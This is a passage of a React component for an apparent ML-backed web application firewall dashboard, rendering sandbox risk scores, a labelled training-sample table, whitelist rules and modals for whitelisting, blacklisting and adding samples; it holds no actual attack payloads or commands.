                    <div style={{ fontSize: '24px', fontWeight: '800', color: sandboxResult.risk_score >= 70 ? '#dc2626' : sandboxResult.risk_score >= 40 ? '#d97706' : '#16a34a' }}>
                      {sandboxResult.risk_score}/100
                    </div>
                    <div style={{ fontSize: '11px', color: '#64748b', textTransform: 'uppercase' }}>Risk Score</div>
                  </div>
                </div>

                {/* Score Breakdown Grid */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px', marginBottom: '16px' }}>
                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>Semantic AST</div>
                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a' }}>{sandboxResult.components?.semantic_score}%</div>
                  </div>
                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>Hyper Rules</div>
                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a' }}>{sandboxResult.components?.rule_score}%</div>
                  </div>
                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>ML Neural Probability</div>
                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#7c3aed' }}>{Math.round((sandboxResult.signals?.ml_probability || 0) * 100)}%</div>
                  </div>
                </div>

                {/* Signals */}
                <div style={{ fontSize: '12.5px', color: '#334155', marginBottom: '16px' }}>
                  <div><strong>Threat Category:</strong> {sandboxResult.attack_type || 'None'}</div>
                  {sandboxResult.signals?.rule_matches?.length > 0 && (
                    <div style={{ marginTop: '4px' }}><strong>Matched Rules:</strong> {sandboxResult.signals.rule_matches.join(', ')}</div>
                  )}
                  {sandboxResult.whitelist_match && (
                    <div style={{ marginTop: '4px', color: '#16a34a' }}><strong>Whitelist Exception:</strong> {sandboxResult.whitelist_match}</div>
                  )}
                </div>

                {/* Quick 1-Click Action from Sandbox */}
                <div style={{ display: 'flex', gap: '8px', paddingTop: '14px', borderTop: '1px solid #e2e8f0' }}>
                  <button
                    onClick={() => handleOpenWhitelistModal(null, sandboxPayload)}
                    style={{ flex: 1, padding: '8px', borderRadius: '6px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
                  >
                    <i className="fas fa-shield-heart"></i> Whitelist as Safe (0)
                  </button>
                  <button
                    onClick={() => handleOpenBlacklistModal(null, sandboxPayload)}
                    style={{ flex: 1, padding: '8px', borderRadius: '6px', background: '#dc2626', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
                  >
                    <i className="fas fa-ban"></i> Blacklist & Train ML (1)
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================== TAB 3: ACTIVE ML DATASET & SAMPLES ==================== */}
      {activeTab === 'dataset' && (
        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '14px' }}>
            <div style={{ display: 'flex', gap: '8px' }}>
              {[
                { id: 'all', label: 'All Samples' },
                { id: '0', label: 'Benign Safe (0)' },
                { id: '1', label: 'Attack Threats (1)' }
              ].map(f => (
                <button
                  key={f.id}
                  onClick={() => setSamplesFilter(f.id)}
                  style={{
                    padding: '6px 14px',
                    borderRadius: '8px',
                    border: '1px solid ' + (samplesFilter === f.id ? '#7c3aed' : '#e2e8f0'),
                    background: samplesFilter === f.id ? '#f5f3ff' : '#f8fafc',
                    color: samplesFilter === f.id ? '#7c3aed' : '#475569',
                    fontWeight: '600',
                    fontSize: '12.5px',
                    cursor: 'pointer'
                  }}
                >
                  {f.label}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '8px' }}>
              <button
                onClick={() => setAddSampleModalOpen(true)}
                style={{ padding: '7px 14px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
              >
                <i className="fas fa-plus"></i> Add Training Sample
              </button>
              <button
                onClick={handleRetrainModel}
                disabled={retraining}
                style={{ padding: '7px 14px', borderRadius: '8px', background: '#7c3aed', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
              >
                <i className={`fas fa-rotate ${retraining ? 'fa-spin' : ''}`}></i> Retrain Model
              </button>
            </div>
          </div>

          {/* Samples Table */}
          {samplesLoading ? (
            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
              <i className="fas fa-spinner fa-spin fa-2x"></i>
              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading dataset samples...</p>
            </div>
          ) : samples.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Training Samples Found</h3>
              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>Whitelist normal requests or blacklist new attacks to grow your active ML model dataset.</p>
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: '#f8fafc', borderBottom: '1px solid #e2e8f0', color: '#475569', fontSize: '12px', textTransform: 'uppercase' }}>
                    <th style={{ padding: '12px 16px' }}>Classification</th>
                    <th style={{ padding: '12px 16px' }}>Category</th>
                    <th style={{ padding: '12px 16px' }}>Payload Sample</th>
                    <th style={{ padding: '12px 16px' }}>Source</th>
                    <th style={{ padding: '12px 16px' }}>Status</th>
                    <th style={{ padding: '12px 16px', textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {samples.map(sm => (
                    <tr key={sm.id} style={{ borderBottom: '1px solid #f1f5f9' }}>
                      <td style={{ padding: '12px 16px' }}>
                        <span style={{
                          padding: '3px 8px',
                          borderRadius: '12px',
                          fontSize: '11px',
                          fontWeight: '700',
                          background: sm.label === 1 ? '#fee2e2' : '#dcfce7',
                          color: sm.label === 1 ? '#dc2626' : '#16a34a'
                        }}>
                          {sm.label === 1 ? 'Attack Threat (1)' : 'Benign Safe (0)'}
                        </span>
                      </td>
                      <td style={{ padding: '12px 16px', fontWeight: '600', color: '#0f172a' }}>{sm.category}</td>
                      <td style={{ padding: '12px 16px', fontFamily: 'monospace', maxWidth: '380px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', color: '#0369a1' }}>
                        {sm.payload}
                      </td>
                      <td style={{ padding: '12px 16px', color: '#64748b' }}>{sm.source}</td>
                      <td style={{ padding: '12px 16px' }}>
                        {sm.trained ? (
                          <span style={{ color: '#16a34a', fontSize: '12px', fontWeight: '600' }}><i className="fas fa-check"></i> Trained</span>
                        ) : (
                          <span style={{ color: '#d97706', fontSize: '12px', fontWeight: '600' }}><i className="fas fa-clock"></i> Queued</span>
                        )}
                      </td>
                      <td style={{ padding: '12px 16px', textAlign: 'right' }}>
                        <button
                          onClick={() => handleDeleteSample(sm.id)}
                          style={{ padding: '4px 8px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fca5a5', color: '#dc2626', fontSize: '12px', cursor: 'pointer' }}
                        >
                          <i className="fas fa-trash"></i>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* ==================== TAB 4: WHITELISTS ==================== */}
      {activeTab === 'whitelists' && (
        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
            <div>
              <h3 style={{ margin: '0 0 4px', fontSize: '16px', color: '#0f172a' }}>Active Whitelist Exception Rules</h3>
              <p style={{ color: '#64748b', fontSize: '12.5px', margin: 0 }}>Matching paths or substrings will completely bypass WAF blocking and prevent 403 errors.</p>
            </div>
            <button
              onClick={() => handleOpenWhitelistModal()}
              style={{ padding: '7px 14px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
            >
              <i className="fas fa-plus"></i> Add Whitelist Rule
            </button>
          </div>

          {whitelistsLoading ? (
            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
              <i className="fas fa-spinner fa-spin fa-2x"></i>
              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading whitelists...</p>
            </div>
          ) : whitelists.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Whitelist Rules Defined</h3>
              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>Add whitelist rules when users report 403 false positives.</p>
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: '#f8fafc', borderBottom: '1px solid #e2e8f0', color: '#475569', fontSize: '12px', textTransform: 'uppercase' }}>
                    <th style={{ padding: '12px 16px' }}>Rule Name</th>
                    <th style={{ padding: '12px 16px' }}>Match Type</th>
                    <th style={{ padding: '12px 16px' }}>Pattern / Path</th>
                    <th style={{ padding: '12px 16px' }}>Description</th>
                    <th style={{ padding: '12px 16px', textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {whitelists.map(wl => (
                    <tr key={wl.id} style={{ borderBottom: '1px solid #f1f5f9' }}>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#0f172a' }}>{wl.name}</td>
                      <td style={{ padding: '12px 16px' }}>
                        <code style={{ background: '#dcfce7', color: '#16a34a', padding: '2px 6px', borderRadius: '4px', fontWeight: '600' }}>
                          {wl.match_type}
                        </code>
                      </td>
                      <td style={{ padding: '12px 16px', fontFamily: 'monospace', color: '#0284c7' }}>{wl.pattern}</td>
                      <td style={{ padding: '12px 16px', color: '#64748b' }}>{wl.description}</td>
                      <td style={{ padding: '12px 16px', textAlign: 'right' }}>
                        <button
                          onClick={() => handleDeleteWhitelist(wl.id)}
                          style={{ padding: '4px 8px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fca5a5', color: '#dc2626', fontSize: '12px', cursor: 'pointer' }}
                        >
                          <i className="fas fa-trash"></i>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* ==================== MODAL: WHITELIST ==================== */}
      {whitelistModalOpen && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(15, 23, 42, 0.6)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#16a34a', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <i className="fas fa-shield-heart"></i> Whitelist Request Pattern (Fix 403)
              </h3>
              <button onClick={() => setWhitelistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
                <i className="fas fa-times"></i>
              </button>
            </div>

            <form onSubmit={handleWhitelistSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Rule Name</label>
                <input
                  type="text"
                  required
                  value={whitelistForm.name}
                  onChange={e => setWhitelistForm({ ...whitelistForm, name: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Match Type</label>
                <select
                  value={whitelistForm.match_type}
                  onChange={e => setWhitelistForm({ ...whitelistForm, match_type: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
                >
                  <option value="contains">Contains Substring</option>
                  <option value="url_path">URL Path Prefix</option>
                  <option value="exact">Exact Match</option>
                  <option value="regex">Regular Expression</option>
                </select>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Pattern to Whitelist</label>
                <input
                  type="text"
                  required
                  value={whitelistForm.pattern}
                  onChange={e => setWhitelistForm({ ...whitelistForm, pattern: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Description / Note</label>
                <input
                  type="text"
                  value={whitelistForm.description}
                  onChange={e => setWhitelistForm({ ...whitelistForm, description: e.target.value })}
                  placeholder="e.g. Legitimate admin payment webhook"
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
                <button type="button" onClick={() => setWhitelistModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Apply Whitelist
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==================== MODAL: BLACKLIST & LEARN ATTACK ==================== */}
      {blacklistModalOpen && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(15, 23, 42, 0.6)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#dc2626', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <i className="fas fa-ban"></i> Blacklist & Train ML Model
              </h3>
              <button onClick={() => setBlacklistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
                <i className="fas fa-times"></i>
              </button>
            </div>

            <form onSubmit={handleBlacklistSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Rule Identifier</label>
                <input
                  type="text"
                  required
                  value={blacklistForm.name}
                  onChange={e => setBlacklistForm({ ...blacklistForm, name: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Attack Category</label>
                <select
                  value={blacklistForm.category}
                  onChange={e => setBlacklistForm({ ...blacklistForm, category: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
                >
                  <option value="SQL Injection">SQL Injection</option>
                  <option value="XSS">XSS (Cross-Site Scripting)</option>
                  <option value="Command Injection">Command Injection (RCE)</option>
                  <option value="Path Traversal">Path Traversal / LFI</option>
                  <option value="SSRF">SSRF</option>
                </select>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Payload Signature to Block & Learn</label>
                <input
                  type="text"
                  required
                  value={blacklistForm.pattern}
                  onChange={e => setBlacklistForm({ ...blacklistForm, pattern: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
                <button type="button" onClick={() => setBlacklistModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#dc2626', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Blacklist & Train ML
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==================== MODAL: ADD TRAINING SAMPLE ==================== */}
      {addSampleModalOpen && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(15, 23, 42, 0.6)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: 'white', borderRadius: '14px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#f8fafc' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#7c3aed', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <i className="fas fa-plus"></i> Add Sample to ML Dataset
              </h3>
              <button onClick={() => setAddSampleModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer' }}>
                <i className="fas fa-times"></i>
              </button>
            </div>

            <form onSubmit={handleAddSampleSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Sample Type</label>
                <select
                  value={sampleForm.label}
                  onChange={e => setSampleForm({ ...sampleForm, label: Number(e.target.value) })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', background: 'white' }}
                >
                  <option value={1}>Malicious Attack Sample (Label = 1: Should Block 403)</option>
                  <option value={0}>Benign Legitimate Sample (Label = 0: Should Allow 200)</option>
                </select>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Category</label>
                <input
                  type="text"
                  value={sampleForm.category}
                  onChange={e => setSampleForm({ ...sampleForm, category: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>Raw Payload Sample</label>
                <textarea
                  rows={4}
                  required
                  value={sampleForm.payload}
                  onChange={e => setSampleForm({ ...sampleForm, payload: e.target.value })}
                  style={{ width: '100%', padding: '9px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
                <button type="button" onClick={() => setAddSampleModalOpen(false)} style={{ padding: '8px 16px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#64748b', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '8px 18px', borderRadius: '8px', background: '#7c3aed', color: 'white', border: 'none', fontSize: '13px', fontWeight: '600', cursor: 'pointer' }}>
                  Add to Dataset
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </>
  )
}
